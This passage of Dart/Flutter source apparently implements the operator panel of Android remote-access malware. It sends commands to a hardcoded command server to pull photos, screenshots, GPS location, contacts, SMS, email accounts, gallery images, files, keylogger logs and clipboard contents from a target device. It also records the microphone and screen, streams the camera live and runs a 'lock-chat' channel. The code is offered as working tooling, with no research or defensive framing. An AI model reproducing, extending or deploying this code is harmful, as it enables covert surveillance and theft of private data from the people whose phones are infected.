import 'dart:async';
import 'dart:convert';
import 'dart:typed_data';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'package:url_launcher/url_launcher.dart';

// ─── BASE URL ──────────────────────────────────────────────────────────────
const String _kBase = 'http://shinoa-cpanelpanel.xtxintax.my.id:2003';

// ─── MODERN THEME ─────────────────────────────────────────────────────────
class _T {
  // Core palette — soft violet aurora
  static const primary = Color(0xFF7C5CFF);
  static const primaryDeep = Color(0xFF5B3FD9);
  static const primarySoft = Color(0xFFEDE7FF);
  static const accent = Color(0xFF00D4B8);
  static const accentSoft = Color(0xFFD6FFF8);

  // Surfaces
  static const bg = Color(0xFFF7F5FF);
  static const bgAlt = Color(0xFFF0ECFF);
  static const surface = Color(0xFFFFFFFF);
  static const surfaceAlt = Color(0xFFFAF9FF);

  // Text
  static const ink = Color(0xFF15132B);
  static const inkMid = Color(0xFF5A5678);
  static const inkSoft = Color(0xFF9490B3);
  static const inkFaint = Color(0xFFC5C2D9);

  // Utility
  static const line = Color(0xFFEDE9FB);
  static const success = Color(0xFF00C48C);
  static const warning = Color(0xFFFFA53D);
  static const danger = Color(0xFFFF5C7A);
  static const info = Color(0xFF4DA6FF);
  static const purple = Color(0xFF8B6EE8);
  static const cyan = Color(0xFF3FD4E0);
  static const orange = Color(0xFFFF8A65);
  static const secondary = Color(0xFFA78BFA);

  // Gradients
  static const gradPrimary = LinearGradient(
    colors: [Color(0xFF8B6EE8), Color(0xFF5B3FD9)],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );
  static const gradAccent = LinearGradient(
    colors: [Color(0xFF00D4B8), Color(0xFF3FD4E0)],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );
  static const gradDanger = LinearGradient(
    colors: [Color(0xFFFF5C7A), Color(0xFFFF8A65)],
    begin: Alignment.topLeft,
    end: Alignment.bottomRight,
  );
  static const gradBg = LinearGradient(
    colors: [Color(0xFFF7F5FF), Color(0xFFEFEAFF)],
    begin: Alignment.topCenter,
    end: Alignment.bottomCenter,
  );

  // Shadows
  static List<BoxShadow> shadowSoft = [
    BoxShadow(
      color: Color(0xFF7C5CFF).withOpacity(0.08),
      blurRadius: 20,
      offset: Offset(0, 6),
    ),
  ];
  static List<BoxShadow> shadowMed = [
    BoxShadow(
      color: Color(0xFF7C5CFF).withOpacity(0.12),
      blurRadius: 24,
      offset: Offset(0, 8),
    ),
  ];
  static List<BoxShadow> shadowFloat = [
    BoxShadow(
      color: Color(0xFF5B3FD9).withOpacity(0.18),
      blurRadius: 30,
      offset: Offset(0, 12),
    ),
  ];
}

// ─── MAIN CONTROL CENTER ─────────────────────────────────────────────────
class ControlCenterPage extends StatefulWidget {
  final Map<String, dynamic>? targetDevice;
  final String role;
  const ControlCenterPage({super.key, this.targetDevice, this.role = 'owner'});
  @override
  State<ControlCenterPage> createState() => _ControlCenterState();
}

class _ControlCenterState extends State<ControlCenterPage>
    with SingleTickerProviderStateMixin {
  // ── Device Info ──────────────────────────────────────────────────────
  String get _id => widget.targetDevice?['id']?.toString() ?? 'unknown';
  String get _model => widget.targetDevice?['model']?.toString() ?? 'No Device';
  String get _battery => widget.targetDevice?['battery']?.toString() ?? '--';

  // ── State ────────────────────────────────────────────────────────────
  late TabController _tabs;
  bool _sending = false;
  final List<String> _log = [];

  // Live
  bool _liveOn = false;
  Uint8List? _frame;
  Timer? _liveTimer;
  String _liveTitle = '';
  int _fps = 0, _frmCount = 0;
  DateTime _fpsTs = DateTime.now();
  final _frameNotifier = ValueNotifier<int>(0);

  // Chat
  final List<Map<String, String>> _chat = [];
  final _chatCtrl = TextEditingController();
  final _chatScroll = ScrollController();
  Timer? _chatTimer;

  @override
  void initState() {
    super.initState();
    _tabs = TabController(length: 8, vsync: this);
    WidgetsBinding.instance
        .addPostFrameCallback((_) => _cmd('force_open', silent: true));
    _chatTimer =
        Timer.periodic(const Duration(seconds: 3), (_) => _pollChat());
  }

  @override
  void dispose() {
    _liveTimer?.cancel();
    _chatTimer?.cancel();
    _tabs.dispose();
    _chatCtrl.dispose();
    _chatScroll.dispose();
    _frameNotifier.dispose();
    super.dispose();
  }

  // ── Helpers ──────────────────────────────────────────────────────────
  void _addLog(String m) {
    if (!mounted) return;
    setState(() {
      _log.insert(0, '[${DateTime.now().toString().substring(11, 19)}]  $m');
      if (_log.length > 60) _log.removeLast();
    });
  }

  void _toast(String m, {Color c = _T.primary}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        backgroundColor: c,
        elevation: 0,
        content: Row(
          children: [
            const Icon(Icons.info_outline, color: Colors.white, size: 18),
            const SizedBox(width: 10),
            Expanded(
              child: Text(
                m,
                style: const TextStyle(
                  fontWeight: FontWeight.w600,
                  fontSize: 13,
                  letterSpacing: 0.2,
                ),
              ),
            ),
          ],
        ),
        duration: const Duration(seconds: 2),
        behavior: SnackBarBehavior.floating,
        margin: const EdgeInsets.all(16),
        shape:
            RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
      ),
    );
  }

  // ── Send Command ─────────────────────────────────────────────────────
  Future<void> _cmd(String cmd,
      {String extra = '', bool silent = false}) async {
    if (_id == 'unknown') {
      if (!silent) _toast('No device selected', c: _T.danger);
      return;
    }
    if (!silent) setState(() => _sending = true);
    try {
      final res = await http
          .post(
            Uri.parse('$_kBase/api/send-command'),
            headers: {'Content-Type': 'application/json'},
            body: jsonEncode({'id': _id, 'command': cmd, 'extra': extra}),
          )
          .timeout(const Duration(seconds: 15));
      if (res.statusCode == 200) {
        if (!silent) {
          _addLog('Sent: $cmd');
          _toast('Command sent', c: _T.success);
        }
        if (_needPoll.contains(cmd)) _poll(cmd);
      } else {
        if (!silent) {
          _addLog('Error $cmd (${res.statusCode})');
          _toast('Target offline', c: _T.danger);
        }
      }
    } catch (e) {
      if (!silent) {
        _addLog('Conn error: $e');
        _toast('Connection failed', c: _T.danger);
      }
    } finally {
      if (!silent && mounted) setState(() => _sending = false);
    }
  }

  // ── Poll Response ────────────────────────────────────────────────────
  static const Set<String> _needPoll = {
    'take_photo', 'get_screen', 'get_location', 'track_gps',
    'get_contacts', 'dump_contacts', 'get_gmails', 'get_sms', 'get_gallery',
    'list_files', 'download_file', 'get_keylogs', 'get_clipboard',
    'get_apps', 'start_mic', 'stop_mic', 'start_screen_record',
    'stop_screen_record',
  };

  void _poll(String cmd) async {
    final max = cmd == 'get_gallery' || cmd == 'list_files' ? 60 : 30;
    int n = 0;
    bool got = false;
    while (n < max && !got && mounted) {
      await Future.delayed(const Duration(milliseconds: 1000));
      n++;
      _addLog('Polling $cmd ($n/$max)');
      try {
        final res = await http
            .get(Uri.parse('$_kBase/api/get-response/$_id'))
            .timeout(const Duration(seconds: 8));
        if (res.statusCode == 200 && res.body.isNotEmpty && res.body != '{}') {
          final d = jsonDecode(res.body);
          if (d['data'] != null) {
            final rc = d['cmd']?.toString() ?? '';
            if (rc.isEmpty || rc == cmd) {
              _onResponse(cmd, d['data']);
              got = true;
            }
          }
        }
      } catch (_) {}
    }
    if (!got && mounted) _addLog('Timeout: $cmd');
  }

  void _onResponse(String cmd, dynamic d) {
    if (!mounted) return;
    switch (cmd) {
      case 'take_photo':
        final b = d['image_base64']?.toString() ?? '';
        if (b.isEmpty) {
          _toast('No photo', c: _T.warning);
          return;
        }
        _addLog('Photo received');
        _showImageDialog(b, 'Captured Photo');
        break;
      case 'get_screen':
        final b = d['image_base64']?.toString() ?? '';
        if (b.isEmpty) return;
        _addLog('Screenshot received');
        _showImageDialog(b, 'Screen Capture');
        break;
      case 'get_location':
      case 'track_gps':
        _addLog('GPS received');
        _showLocationDialog(d['lat'], d['lng']);
        break;
      case 'get_contacts':
      case 'dump_contacts':
        final l = d['contacts'] as List? ?? [];
        _addLog('${l.length} contacts');
        _showListDialog('Contacts', l, Icons.people_alt_rounded, _T.primary);
        break;
      case 'get_gmails':
        _addLog('Accounts received');
        _showTextDialog('Accounts & Emails', d['accounts']?.toString() ?? '-');
        break;
      case 'get_sms':
        final s = d['sms'] as List? ?? [];
        _addLog('${s.length} SMS');
        _showListDialog('SMS Messages', s, Icons.sms_rounded, _T.cyan);
        break;
      case 'get_gallery':
        final imgs = d['images'] as List? ?? [];
        _addLog('${imgs.length} gallery photos');
        _showGalleryDialog(imgs);
        break;
      case 'list_files':
        final files = d['files'] as List? ?? [];
        _addLog('${files.length} files');
        _showListDialog(
            'File Manager', files, Icons.folder_rounded, _T.purple);
        break;
      case 'get_keylogs':
        final logs = d['logs'] as List? ?? [];
        _addLog('${logs.length} keylogs');
        _showListDialog(
            'Keylogger Logs', logs, Icons.keyboard_rounded, _T.warning);
        break;
      case 'get_clipboard':
        final text = d['clipboard']?.toString() ?? '';
        _addLog('Clipboard: $text');
        _showTextDialog('Clipboard Content', text);
        break;
      case 'get_apps':
        final apps = d['apps'] as List? ?? [];
        _addLog('${apps.length} installed apps');
        _showListDialog(
            'Installed Apps', apps, Icons.apps_rounded, _T.secondary);
        break;
      case 'start_mic':
        _addLog('Microphone recording started');
        _toast('Recording audio...', c: _T.orange);
        break;
      case 'stop_mic':
        final b = d['audio_base64']?.toString() ?? '';
        if (b.isNotEmpty) {
          _addLog('Audio received (${b.length} bytes)');
          _toast('Audio recorded', c: _T.success);
        }
        break;
      case 'start_screen_record':
        _addLog('Screen recording started');
        _toast('Recording screen...', c: _T.orange);
        break;
      case 'stop_screen_record':
        final b = d['video_base64']?.toString() ?? '';
        if (b.isNotEmpty) {
          _addLog('Video received (${b.length} bytes)');
          _toast('Screen recording saved', c: _T.success);
        }
        break;
      default:
        _addLog('$cmd completed');
    }
  }

  // ── Live Stream ──────────────────────────────────────────────────────
  Future<void> _startLive(String mode, String extra) async {
    await _cmd(mode, extra: extra);
    if (!mounted) return;
    setState(() {
      _liveOn = true;
      _frame = null;
      _liveTitle = mode == 'live_camera_start'
          ? (extra == 'front' ? 'Front Camera' : 'Rear Camera')
          : 'Screen Mirror';
      _frmCount = 0;
      _fps = 0;
      _fpsTs = DateTime.now();
    });
    _liveTimer?.cancel();
    _liveTimer = Timer.periodic(const Duration(milliseconds: 80), (_) async {
      if (!_liveOn || !mounted) {
        _liveTimer?.cancel();
        return;
      }
      try {
        final res = await http
            .get(Uri.parse('$_kBase/api/live-frame/$_id'))
            .timeout(const Duration(milliseconds: 500));
        if (res.statusCode == 200) {
          final raw = (jsonDecode(res.body)['frame'] ?? '').toString();
          if (raw.isNotEmpty && mounted) {
            final clean = raw.contains(',') ? raw.split(',').last : raw;
            final bytes = base64Decode(clean);
            setState(() {
              _frame = bytes;
              _frmCount++;
              final ms = DateTime.now().difference(_fpsTs).inMilliseconds;
              if (ms >= 1000) {
                _fps = (_frmCount * 1000 / ms).round();
                _frmCount = 0;
                _fpsTs = DateTime.now();
              }
            });
            _frameNotifier.value++;
          }
        }
      } catch (_) {}
    });
  }

  void _stopLive() {
    _liveTimer?.cancel();
    if (mounted) {
      setState(() {
        _liveOn = false;
        _frame = null;
      });
    }
    _cmd('live_stop', silent: true);
    _addLog('Live stream stopped');
  }

  // ── Chat ─────────────────────────────────────────────────────────────
  void _pollChat() async {
    if (_id == 'unknown') return;
    try {
      final res = await http
          .get(Uri.parse('$_kBase/api/lock-chat-all/$_id'))
          .timeout(const Duration(seconds: 4));
      if (res.statusCode == 200) {
        final msgs = (jsonDecode(res.body)['messages'] as List? ?? []);
        if (msgs.length != _chat.length && mounted) {
          setState(() {
            _chat.clear();
            for (final m in msgs) {
              _chat.add({
                'from': m['from']?.toString() ?? '',
                'text': m['text']?.toString() ?? '',
                'time': m['time']?.toString() ?? ''
              });
            }
          });
          _scrollChat();
        }
      }
    } catch (_) {}
  }

  void _sendChat(String text) async {
    if (text.trim().isEmpty) return;
    _chatCtrl.clear();
    setState(() => _chat.add({
          'from': 'owner',
          'text': text.trim(),
          'time': TimeOfDay.now().format(context)
        }));
    _scrollChat();
    try {
      await http
          .post(
            Uri.parse('$_kBase/api/lock-chat/$_id'),
            headers: {'Content-Type': 'application/json'},
            body: jsonEncode({'text': text.trim(), 'from': 'owner'}),
          )
          .timeout(const Duration(seconds: 5));
    } catch (_) {}
  }

  void _scrollChat() {
    Future.delayed(const Duration(milliseconds: 100), () {
      if (_chatScroll.hasClients) {
        _chatScroll.animateTo(
          _chatScroll.position.maxScrollExtent,
          duration: const Duration(milliseconds: 250),
          curve: Curves.easeOutCubic,
        );
      }
    });
  }

  // ─── DIALOGS ──────────────────────────────────────────────────────────
  void _showImageDialog(String b64, String title) {
    try {
      final clean = b64.contains(',') ? b64.split(',').last : b64;
      final bytes = base64Decode(clean);
      showDialog(
        context: context,
        builder: (_) => Dialog(
          backgroundColor: Colors.transparent,
          insetPadding: const EdgeInsets.all(16),
          child: Container(
            decoration: BoxDecoration(
              color: _T.surface,
              borderRadius: BorderRadius.circular(28),
              boxShadow: _T.shadowFloat,
            ),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              children: [
                Padding(
                  padding: const EdgeInsets.fromLTRB(20, 18, 20, 14),
                  child: Row(
                    children: [
                      Container(
                        padding: const EdgeInsets.all(8),
                        decoration: BoxDecoration(
                          gradient: _T.gradPrimary,
                          borderRadius: BorderRadius.circular(12),
                        ),
                        child: const Icon(Icons.image_rounded,
                            color: Colors.white, size: 16),
                      ),
                      const SizedBox(width: 12),
                      Expanded(
                        child: Text(
                          title,
                          style: const TextStyle(
                            color: _T.ink,
                            fontSize: 15,
                            fontWeight: FontWeight.w700,
                          ),
                        ),
                      ),
                      IconButton(
                        onPressed: () => Navigator.pop(context),
                        icon: const Icon(Icons.close_rounded,
                            color: _T.inkSoft, size: 20),
                      ),
                    ],
                  ),
                ),
                Padding(
                  padding: const EdgeInsets.fromLTRB(16, 0, 16, 16),
                  child: ClipRRect(
                    borderRadius: BorderRadius.circular(20),
                    child: Image.memory(bytes, fit: BoxFit.contain),
                  ),
                ),
              ],
            ),
          ),
        ),
      );
    } catch (_) {
      _toast('Failed to decode image', c: _T.danger);
    }
  }

  void _showLocationDialog(dynamic lat, dynamic lng) {
    showDialog(
      context: context,
      builder: (_) => _modernDialog(
        title: 'Location',
        icon: Icons.location_on_rounded,
        iconGradient: _T.gradAccent,
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            _coordTile('Latitude', lat.toString()),
            const SizedBox(height: 10),
            _coordTile('Longitude', lng.toString()),
          ],
        ),
        actions: [
          _dialogBtn(
            label: 'Close',
            onTap: () => Navigator.pop(context),
            outlined: true,
          ),
          _dialogBtn(
            label: 'Open Maps',
            icon: Icons.map_rounded,
            gradient: _T.gradAccent,
            onTap: () => launchUrl(
              Uri.parse(
                  'https://www.google.com/maps/search/?api=1&query=$lat,$lng'),
              mode: LaunchMode.externalApplication,
            ),
          ),
        ],
      ),
    );
  }

  Widget _coordTile(String label, String value) {
    return Container(
      width: double.infinity,
      padding: const EdgeInsets.all(14),
      decoration: BoxDecoration(
        color: _T.bg,
        borderRadius: BorderRadius.circular(14),
        border: Border.all(color: _T.line),
      ),
      child: Row(
        children: [
          Text(
            label,
            style: const TextStyle(
              color: _T.inkMid,
              fontSize: 12,
              fontWeight: FontWeight.w600,
            ),
          ),
          const Spacer(),
          SelectableText(
            value,
            style: const TextStyle(
              color: _T.primary,
              fontFamily: 'monospace',
              fontSize: 14,
              fontWeight: FontWeight.w700,
            ),
          ),
        ],
      ),
    );
  }

  void _showTextDialog(String title, String content) {
    showDialog(
      context: context,
      builder: (_) => _modernDialog(
        title: title,
        icon: Icons.text_snippet_rounded,
        iconGradient: _T.gradPrimary,
        content: Container(
          width: double.infinity,
          padding: const EdgeInsets.all(14),
          decoration: BoxDecoration(
            color: _T.bg,
            borderRadius: BorderRadius.circular(14),
            border: Border.all(color: _T.line),
          ),
          child: SelectableText(
            content,
            style: const TextStyle(
              color: _T.ink,
              fontFamily: 'monospace',
              fontSize: 13,
              height: 1.5,
            ),
          ),
        ),
        actions: [
          _dialogBtn(
            label: 'Close',
            onTap: () => Navigator.pop(context),
            outlined: true,
          ),
        ],
      ),
    );
  }

  void _showListDialog(
      String title, List items, IconData icon, Color color) {
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      builder: (_) => Container(
        decoration: const BoxDecoration(
          color: _T.surface,
          borderRadius: BorderRadius.vertical(top: Radius.circular(32)),
        ),
        child: DraggableScrollableSheet(
          initialChildSize: 0.65,
          maxChildSize: 0.92,
          expand: false,
          builder: (_, sc) => Column(
            children: [
              _sheetHandle(),
              const SizedBox(height: 4),
              Padding(
                padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 8),
                child: Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(10),
                      decoration: BoxDecoration(
                        color: color.withOpacity(0.12),
                        borderRadius: BorderRadius.circular(12),
                      ),
                      child: Icon(icon, color: color, size: 20),
                    ),
                    const SizedBox(width: 12),
                    Expanded(
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text(
                            title,
                            style: const TextStyle(
                              color: _T.ink,
                              fontSize: 16,
                              fontWeight: FontWeight.w700,
                            ),
                          ),
                          Text(
                            '${items.length} items',
                            style: const TextStyle(
                              color: _T.inkSoft,
                              fontSize: 12,
                            ),
                          ),
                        ],
                      ),
                    ),
                    IconButton(
                      onPressed: () => Navigator.pop(context),
                      icon: const Icon(Icons.close_rounded,
                          color: _T.inkSoft, size: 20),
                    ),
                  ],
                ),
              ),
              const Divider(height: 1, color: _T.line),
              Expanded(
                child: items.isEmpty
                    ? const Center(
                        child: Text(
                          'Empty',
                          style: TextStyle(color: _T.inkSoft, fontSize: 13),
                        ),
                      )
                    : ListView.separated(
                        controller: sc,
                        padding: const EdgeInsets.all(16),
                        itemCount: items.length,
                        separatorBuilder: (_, __) =>
                            const SizedBox(height: 8),
                        itemBuilder: (_, i) {
                          final item = items[i] as Map;
                          return Container(
                            padding: const EdgeInsets.all(12),
                            decoration: BoxDecoration(
                              color: _T.surfaceAlt,
                              borderRadius: BorderRadius.circular(16),
                              border: Border.all(color: _T.line),
                            ),
                            child: Row(
                              children: [
                                Container(
                                  width: 40,
                                  height: 40,
                                  decoration: BoxDecoration(
                                    color: color.withOpacity(0.1),
                                    borderRadius: BorderRadius.circular(12),
                                  ),
                                  child: Icon(icon, color: color, size: 18),
                                ),
                                const SizedBox(width: 12),
                                Expanded(
                                  child: Column(
                                    crossAxisAlignment:
                                        CrossAxisAlignment.start,
                                    children: [
                                      Text(
                                        item['name']?.toString() ??
                                            item['title']?.toString() ??
                                            'Item ${i + 1}',
                                        style: const TextStyle(
                                          color: _T.ink,
                                          fontSize: 13,
                                          fontWeight: FontWeight.w600,
                                        ),
                                        maxLines: 1,
                                        overflow: TextOverflow.ellipsis,
                                      ),
                                      if ((item['detail']?.toString() ??
                                              item['number']?.toString() ??
                                              '')
                                          .isNotEmpty)
                                        Padding(
                                          padding:
                                              const EdgeInsets.only(top: 2),
                                          child: Text(
                                            item['detail']?.toString() ??
                                                item['number']?.toString() ??
                                                '',
                                            style: const TextStyle(
                                              color: _T.inkSoft,
                                              fontSize: 12,
                                            ),
                                            maxLines: 1,
                                            overflow: TextOverflow.ellipsis,
                                          ),
                                        ),
                                    ],
                                  ),
                                ),
                                const Icon(Icons.chevron_right_rounded,
                                    color: _T.inkFaint, size: 20),
                              ],
                            ),
                          );
                        },
                      ),
              ),
              const SizedBox(height: 12),
            ],
          ),
        ),
      ),
    );
  }

  void _showGalleryDialog(List imgs) {
    showModalBottomSheet(
      context: context,
      backgroundColor: Colors.transparent,
      isScrollControlled: true,
      builder: (_) => Container(
        decoration: const BoxDecoration(
          color: _T.surface,
          borderRadius: BorderRadius.vertical(top: Radius.circular(32)),
        ),
        child: DraggableScrollableSheet(
          initialChildSize: 0.8,
          maxChildSize: 0.95,
          expand: false,
          builder: (_, sc) => Column(
            children: [
              _sheetHandle(),
              Padding(
                padding: const EdgeInsets.fromLTRB(20, 12, 20, 8),
                child: Row(
                  children: [
                    Container(
                      padding: const EdgeInsets.all(10),
                      decoration: BoxDecoration(
                        gradient: _T.gradPrimary,
                        borderRadius: BorderRadius.circular(12),
                      ),
                      child: const Icon(Icons.photo_library_rounded,
                          color: Colors.white, size: 18),
                    ),
                    const SizedBox(width: 12),
                    Expanded(
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          const Text(
                            'Gallery',
                            style: TextStyle(
                              color: _T.ink,
                              fontSize: 16,
                              fontWeight: FontWeight.w700,
                            ),
                          ),
                          Text(
                            '${imgs.length} photos',
                            style: const TextStyle(
                              color: _T.inkSoft,
                              fontSize: 12,
                            ),
                          ),
                        ],
                      ),
                    ),
                    IconButton(
                      onPressed: () => Navigator.pop(context),
                      icon: const Icon(Icons.close_rounded,
                          color: _T.inkSoft, size: 20),
                    ),
                  ],
                ),
              ),
              Expanded(
                child: imgs.isEmpty
                    ? const Center(
                        child: Text(
                          'No photos',
                          style: TextStyle(color: _T.inkSoft, fontSize: 13),
                        ),
                      )
                    : GridView.builder(
                        controller: sc,
                        padding: const EdgeInsets.all(12),
                        gridDelegate:
                            const SliverGridDelegateWithFixedCrossAxisCount(
                          crossAxisCount: 3,
                          crossAxisSpacing: 8,
                          mainAxisSpacing: 8,
                        ),
                        itemCount: imgs.length,
                        itemBuilder: (_, i) {
                          try {
                            final raw = imgs[i].toString();
                            final clean =
                                raw.contains(',') ? raw.split(',').last : raw;
                            final bytes = base64Decode(clean);
                            return GestureDetector(
                              onTap: () =>
                                  _showImageDialog(raw, 'Photo ${i + 1}'),
                              child: ClipRRect(
                                borderRadius: BorderRadius.circular(14),
                                child: Image.memory(bytes,
                                    fit: BoxFit.cover),
                              ),
                            );
                          } catch (_) {
                            return Container(
                              decoration: BoxDecoration(
                                color: _T.bg,
                                borderRadius: BorderRadius.circular(14),
                              ),
                              child: const Icon(Icons.broken_image_rounded,
                                  color: _T.inkFaint),
                            );
                          }
                        },
                      ),
              ),
              const SizedBox(height: 12),
            ],
          ),
        ),
      ),
    );
  }

  Widget _sheetHandle() {
    return Container(
      height: 5,
      width: 44,
      margin: const EdgeInsets.only(top: 12),
      decoration: BoxDecoration(
        color: _T.inkFaint,
        borderRadius: BorderRadius.circular(3),
      ),
    );
  }

  // ─── MODERN DIALOG HELPERS ────────────────────────────────────────────
  Widget _modernDialog({
    required String title,
    required IconData icon,
    required Gradient iconGradient,
    required Widget content,
    required List<Widget> actions,
  }) {
    return Dialog(
      backgroundColor: Colors.transparent,
      insetPadding: const EdgeInsets.all(20),
      child: Container(
        padding: const EdgeInsets.all(20),
        decoration: BoxDecoration(
          color: _T.surface,
          borderRadius: BorderRadius.circular(28),
          boxShadow: _T.shadowFloat,
        ),
        child: Column(
          mainAxisSize: MainAxisSize.min,
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Row(
              children: [
                Container(
                  padding: const EdgeInsets.all(10),
                  decoration: BoxDecoration(
                    gradient: iconGradient,
                    borderRadius: BorderRadius.circular(12),
                  ),
                  child: Icon(icon, color: Colors.white, size: 18),
                ),
                const SizedBox(width: 12),
                Expanded(
                  child: Text(
                    title,
                    style: const TextStyle(
                      color: _T.ink,
                      fontSize: 16,
                      fontWeight: FontWeight.w700,
                    ),
                  ),
                ),
              ],
            ),
            const SizedBox(height: 16),
            content,
            const SizedBox(height: 20),
            Row(
              mainAxisAlignment: MainAxisAlignment.end,
              children: actions,
            ),
          ],
        ),
      ),
    );
  }

  Widget _dialogBtn({
    required String label,
    required VoidCallback onTap,
    IconData? icon,
    Gradient? gradient,
    bool outlined = false,
  }) {
    return Padding(
      padding: const EdgeInsets.only(left: 8),
      child: GestureDetector(
        onTap: onTap,
        child: Container(
          padding: const EdgeInsets.symmetric(horizontal: 18, vertical: 12),
          decoration: BoxDecoration(
            gradient: outlined ? null : (gradient ?? _T.gradPrimary),
            color: outlined ? Colors.transparent : null,
            borderRadius: BorderRadius.circular(12),
            border: outlined
                ? Border.all(color: _T.line, width: 1.2)
                : null,
          ),
          child: Row(
            mainAxisSize: MainAxisSize.min,
            children: [
              if (icon != null) ...[
                Icon(icon,
                    color: outlined ? _T.inkMid : Colors.white, size: 16),
                const SizedBox(width: 6),
              ],
              Text(
                label,
                style: TextStyle(
                  color: outlined ? _T.inkMid : Colors.white,
                  fontSize: 13,
                  fontWeight: FontWeight.w700,
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  // ── Input Dialog ─────────────────────────────────────────────────────
  void _inputDialog(String title, String label, Function(String) onDone,
      {bool isNumber = false, String hint = ''}) {
    final ctrl = TextEditingController();
    showDialog(
      context: context,
      builder: (_) => _modernDialog(
        title: title,
        icon: Icons.edit_rounded,
        iconGradient: _T.gradPrimary,
        content: _buildTextField(ctrl, label, hint: hint, isNum: isNumber),
        actions: [
          _dialogBtn(
            label: 'Cancel',
            outlined: true,
            onTap: () => Navigator.pop(context),
          ),
          _dialogBtn(
            label: 'Send',
            icon: Icons.send_rounded,
            onTap: () {
              Navigator.pop(context);
              onDone(ctrl.text.trim());
            },
          ),
        ],
      ),
    );
  }

  // ── UI Helpers ────────────────────────────────────────────────────────
  Widget _buildTextField(TextEditingController ctrl, String label,
      {String hint = '', bool isNum = false}) {
    return TextField(
      controller: ctrl,
      keyboardType: isNum ? TextInputType.number : TextInputType.text,
      style: const TextStyle(color: _T.ink, fontSize: 14),
      decoration: InputDecoration(
        labelText: label,
        hintText: hint,
        labelStyle: const TextStyle(
          color: _T.inkMid,
          fontSize: 13,
          fontWeight: FontWeight.w600,
        ),
        hintStyle: const TextStyle(color: _T.inkFaint, fontSize: 13),
        filled: true,
        fillColor: _T.bg,
        contentPadding:
            const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
        border: OutlineInputBorder(
          borderRadius: BorderRadius.circular(14),
          borderSide: BorderSide.none,
        ),
        enabledBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(14),
          borderSide: BorderSide.none,
        ),
        focusedBorder: OutlineInputBorder(
          borderRadius: BorderRadius.circular(14),
          borderSide: const BorderSide(color: _T.primary, width: 1.5),
        ),
      ),
    );
  }

  // ─── BUILD ─────────────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _T.bg,
      body: Container(
        decoration: const BoxDecoration(gradient: _T.gradBg),
        child: SafeArea(
          child: Column(
            children: [
              _buildHeader(),
              _buildTabBar(),
              _buildLogBar(),
              Expanded(
                child: Stack(
                  children: [
                    TabBarView(
                      controller: _tabs,
                      children: [
                        _buildLiveTab(),
                        _buildControlTab(),
                        _buildDataTab(),
                        _buildAudioTab(),
                        _buildActionTab(),
                        _buildStopTab(),
                        _buildChatLockTab(),
                        _buildAdvancedTab(),
                      ],
                    ),
                    if (_sending)
                      Positioned(
                        top: 0,
                        left: 0,
                        right: 0,
                        child: Container(
                          height: 2,
                          child: const LinearProgressIndicator(
                            backgroundColor: Colors.transparent,
                            color: _T.primary,
                            minHeight: 2,
                          ),
                        ),
                      ),
                  ],
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  // ─── HEADER ────────────────────────────────────────────────────────────
  Widget _buildHeader() {
    return Container(
      padding: const EdgeInsets.fromLTRB(20, 16, 16, 12),
      child: Row(
        children: [
          Container(
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(18),
              boxShadow: _T.shadowMed,
            ),
            child: ClipRRect(
              borderRadius: BorderRadius.circular(18),
              child: Image.asset(
                'assets/images/control.png',
                height: 50,
                width: 50,
                fit: BoxFit.cover,
                errorBuilder: (_, __, ___) => Container(
                  height: 50,
                  width: 50,
                  decoration: BoxDecoration(
                    gradient: _T.gradPrimary,
                    borderRadius: BorderRadius.circular(18),
                  ),
                  child: const Icon(Icons.control_point_rounded,
                      color: Colors.white, size: 28),
                ),
              ),
            ),
          ),
          const SizedBox(width: 14),
          Expanded(
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(
                  _model,
                  style: const TextStyle(
                    color: _T.ink,
                    fontSize: 17,
                    fontWeight: FontWeight.w800,
                    letterSpacing: -0.3,
                  ),
                  maxLines: 1,
                  overflow: TextOverflow.ellipsis,
                ),
                const SizedBox(height: 4),
                Row(
                  children: [
                    _headerChip(
                      icon: Icons.battery_charging_full_rounded,
                      label: '$_battery%',
                      color: _T.success,
                    ),
                    const SizedBox(width: 8),
                    _headerChip(
                      icon: Icons.circle,
                      label: _id != 'unknown' ? 'Online' : 'Offline',
                      color: _id != 'unknown' ? _T.success : _T.inkFaint,
                      isDot: true,
                    ),
                  ],
                ),
              ],
            ),
          ),
          _iconBtn(
            icon: Icons.refresh_rounded,
            onTap: () {
              setState(() {});
              _cmd('force_open', silent: true);
            },
          ),
        ],
      ),
    );
  }

  Widget _headerChip({
    required IconData icon,
    required String label,
    required Color color,
    bool isDot = false,
  }) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
      decoration: BoxDecoration(
        color: color.withOpacity(0.1),
        borderRadius: BorderRadius.circular(8),
      ),
      child: Row(
        mainAxisSize: MainAxisSize.min,
        children: [
          Icon(icon, color: color, size: isDot ? 7 : 12),
          const SizedBox(width: 4),
          Text(
            label,
            style: TextStyle(
              color: color,
              fontSize: 11,
              fontWeight: FontWeight.w700,
            ),
          ),
        ],
      ),
    );
  }

  Widget _iconBtn({required IconData icon, required VoidCallback onTap}) {
    return GestureDetector(
      onTap: onTap,
      child: Container(
        padding: const EdgeInsets.all(10),
        decoration: BoxDecoration(
          color: _T.surface,
          borderRadius: BorderRadius.circular(14),
          boxShadow: _T.shadowSoft,
        ),
        child: Icon(icon, color: _T.primary, size: 20),
      ),
    );
  }

